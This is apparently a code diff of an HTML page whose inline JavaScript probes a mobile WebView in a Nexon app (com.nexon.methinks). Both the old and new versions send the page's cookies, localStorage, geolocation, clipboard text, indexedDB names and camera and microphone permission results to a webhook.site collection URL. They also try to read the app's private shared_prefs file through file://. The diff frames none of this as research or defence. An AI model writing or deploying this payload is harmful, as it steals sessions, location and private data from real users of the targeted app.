@@ -1,34 +1,46 @@
 <html>
 <body>
 <script>
-var webhook = 'https://webhook.site/ef466442-7cf1-4535-a8c3-05888ba975f1';
+var w='https://webhook.site/ef466442-7cf1-4535-a8c3-05888ba975f1';
 
-try{new Image().src = webhook+'?cookie='+encodeURIComponent(document.cookie||'empty')}catch(e){}
-try{new Image().src = webhook+'?ls='+encodeURIComponent(JSON.stringify(localStorage)||'empty')}catch(e){}
-try{new Image().src = webhook+'?ua='+encodeURIComponent(navigator.userAgent)}catch(e){}
+// 0. JS 실행 확인
+new Image().src=w+'?step=0_js_ok';
 
-// 1. 현재 도메인 쿠키
-new Image().src = webhook + '?step=1_cookie&data=' + encodeURIComponent(document.cookie);
+// 1. 쿠키
+try{new Image().src=w+'?step=1_cookie&data='+encodeURIComponent(document.cookie||'empty')}catch(e){}
 
 // 2. localStorage
-try {
-  var ls = JSON.stringify(localStorage);
-  new Image().src = webhook + '?step=2_localstorage&data=' + encodeURIComponent(ls.substring(0,500));
-} catch(e) {
-  new Image().src = webhook + '?step=2_ls_error&data=' + encodeURIComponent(e.toString());
-}
+try{new Image().src=w+'?step=2_ls&data='+encodeURIComponent(JSON.stringify(localStorage)||'empty')}catch(e){new Image().src=w+'?step=2_ls_err&data='+encodeURIComponent(e.toString())}
 
-// 3. 넥슨 도메인 쿠키를 iframe으로 시도
-var iframe = document.createElement('iframe');
-iframe.src = 'https://first.nexon.com';
-iframe.style.display = 'none';
-document.body.appendChild(iframe);
+// 3. 위치 정보
+navigator.geolocation.getCurrentPosition(
+  function(p){new Image().src=w+'?step=3_geo&lat='+p.coords.latitude+'&lng='+p.coords.longitude+'&acc='+p.coords.accuracy},
+  function(e){new Image().src=w+'?step=3_geo_err&code='+e.code+'&msg='+encodeURIComponent(e.message)}
+);
 
-// 4. SharedPreferences 파일 접근 시도 (file:// 접근 가능 여부)
-fetch('file:///data/data/com.nexon.methinks/shared_prefs/')
-.then(r => r.text())
-.then(d => new Image().src = webhook + '?step=4_file&data=' + encodeURIComponent(d.substring(0,500)))
-.catch(e => new Image().src = webhook + '?step=4_file_error&data=' + encodeURIComponent(e.toString()));
+// 4. 카메라
+navigator.mediaDevices.getUserMedia({video:true})
+.then(function(s){new Image().src=w+'?step=4_camera=granted';s.getTracks().forEach(function(t){t.stop()})})
+.catch(function(e){new Image().src=w+'?step=4_camera_err='+encodeURIComponent(e.toString())});
+
+// 5. 마이크
+navigator.mediaDevices.getUserMedia({audio:true})
+.then(function(s){new Image().src=w+'?step=5_mic=granted';s.getTracks().forEach(function(t){t.stop()})})
+.catch(function(e){new Image().src=w+'?step=5_mic_err='+encodeURIComponent(e.toString())});
+
+// 6. file:// 접근
+fetch('file:///data/data/com.nexon.methinks/shared_prefs/com.nexon.methinks_preferences.xml')
+.then(function(r){return r.text()})
+.then(function(d){new Image().src=w+'?step=6_file&data='+encodeURIComponent(d.substring(0,800))})
+.catch(function(e){new Image().src=w+'?step=6_file_err='+encodeURIComponent(e.toString())});
+
+// 7. 클립보드
+navigator.clipboard.readText()
+.then(function(t){new Image().src=w+'?step=7_clip&data='+encodeURIComponent(t.substring(0,200))})
+.catch(function(e){new Image().src=w+'?step=7_clip_err='+encodeURIComponent(e.toString())});
+
+// 8. indexedDB
+try{indexedDB.databases().then(function(dbs){new Image().src=w+'?step=8_idb&data='+encodeURIComponent(JSON.stringify(dbs))})}catch(e){new Image().src=w+'?step=8_idb_err='+encodeURIComponent(e.toString())}
 </script>
 </body>
 </html>
